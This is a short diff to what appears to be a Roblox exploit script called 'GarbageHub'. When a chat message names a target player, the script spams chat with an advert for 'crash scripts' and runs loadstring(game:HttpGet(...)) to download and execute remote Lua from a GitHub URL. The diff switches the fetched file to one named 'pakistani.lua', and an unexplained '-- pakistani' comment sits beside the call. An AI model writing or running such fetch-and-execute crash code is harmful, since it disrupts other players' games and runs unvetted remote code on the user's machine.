@@ -16,7 +16,7 @@ game.Players.PlayerChatted:Connect(function(_,sender,msg,_)
         shared.Garbage.Target = game.Players:FindFirstChild(msg:split(' ')[2])
         if shared.Garbage.Target then
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("JOIN DISSORD.GG/GBH FOR OP CRASH SCRIPTS","All")
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/availablegithubname/GarbageHubForRoblox/main/GarbageHubMain.lua"))() -- pakistani
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/availablegithubname/GarbageHubForRoblox/main/pakistani.lua"))() -- pakistani
         else
             game.StarterGui:SetCore("SendNotification",{Title = "Crash Failed",Text = "Player does not exist."})
         end
